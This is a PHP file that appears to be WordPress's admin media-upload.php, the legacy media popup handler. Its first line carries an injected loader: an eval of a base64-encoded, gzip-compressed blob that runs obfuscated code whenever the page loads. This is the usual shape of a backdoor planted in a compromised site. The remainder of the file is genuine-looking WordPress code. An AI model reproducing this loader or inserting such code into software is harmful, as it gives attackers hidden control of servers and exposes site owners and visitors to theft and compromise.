<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Manage media uploaded file.
 *
 * There are many filters in here for media. Plugins can extend functionality
 * by hooking into the filters.
 *
 * @package WordPress
 * @subpackage Administration
 */

if ( ! isset( $_GET['inline'] ) )
	define( 'IFRAME_REQUEST' , true );

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can( 'upload_files' ) ) {
	wp_die( __( 'Sorry, you are not allowed to upload files.' ), 403 );
}

wp_enqueue_script('plupload-handlers');
wp_enqueue_script('image-edit');
wp_enqueue_script('set-post-thumbnail' );
wp_enqueue_style('imgareaselect');
wp_enqueue_script( 'media-gallery' );

@header('Content-Type: ' . get_option('html_type') . '; charset=' . get_option('blog_charset'));

// IDs should be integers
$ID = isset($ID) ? (int) $ID : 0;
$post_id = isset($post_id)? (int) $post_id : 0;

// Require an ID for the edit screen.
if ( isset( $action ) && $action == 'edit' && !$ID ) {
	wp_die(
		'<h1>' . __( 'Something went wrong.' ) . '</h1>' .
		'<p>' . __( 'Invalid item ID.' ) . '</p>',
		403
	);
}

if ( ! empty( $_REQUEST['post_id'] ) && ! current_user_can( 'edit_post' , $_REQUEST['post_id'] ) ) {
	wp_die(
		'<h1>' . __( 'You need a higher level of permission.' ) . '</h1>' .
		'<p>' . __( 'Sorry, you are not allowed to edit this item.' ) . '</p>',
		403
	);
}

// Upload type: image, video, file, ..?
if ( isset($_GET['type']) ) {
	$type = strval($_GET['type']);
} else {
	/**
	 * Filters the default media upload type in the legacy (pre-3.5.0) media popup.
	 *
	 * @since 2.5.0
	 *
	 * @param string $type The default media upload type. Possible values include
	 *                     'image', 'audio', 'video', 'file', etc. Default 'file'.
	 */
	$type = apply_filters( 'media_upload_default_type', 'file' );
}

// Tab: gallery, library, or type-specific.
if ( isset($_GET['tab']) ) {
	$tab = strval($_GET['tab']);
} else {
	/**
	 * Filters the default tab in the legacy (pre-3.5.0) media popup.
	 *
	 * @since 2.5.0
	 *
	 * @param string $type The default media popup tab. Default 'type' (From Computer).
	 */
	$tab = apply_filters( 'media_upload_default_tab', 'type' );
}

$body_id = 'media-upload';

// Let the action code decide how to handle the request.
if ( $tab == 'type' || $tab == 'type_url' || ! array_key_exists( $tab , media_upload_tabs() ) ) {
	/**
	 * Fires inside specific upload-type views in the legacy (pre-3.5.0)
	 * media popup based on the current tab.
	 *
	 * The dynamic portion of the hook name, `$type`, refers to the specific
	 * media upload type. Possible values include 'image', 'audio', 'video',
	 * 'file', etc.
	 *
	 * The hook only fires if the current `$tab` is 'type' (From Computer),
	 * 'type_url' (From URL), or, if the tab does not exist (i.e., has not
	 * been registered via the {@see 'media_upload_tabs'} filter.
	 *
	 * @since 2.5.0
	 */
	do_action( "media_upload_{$type}" );
} else {
	/**
	 * Fires inside limited and specific upload-tab views in the legacy
	 * (pre-3.5.0) media popup.
	 *
	 * The dynamic portion of the hook name, `$tab`, refers to the specific
	 * media upload tab. Possible values include 'library' (Media Library),
	 * or any custom tab registered via the {@see 'media_upload_tabs'} filter.
	 *
	 * @since 2.5.0
	 */
	do_action( "media_upload_{$tab}" );
}

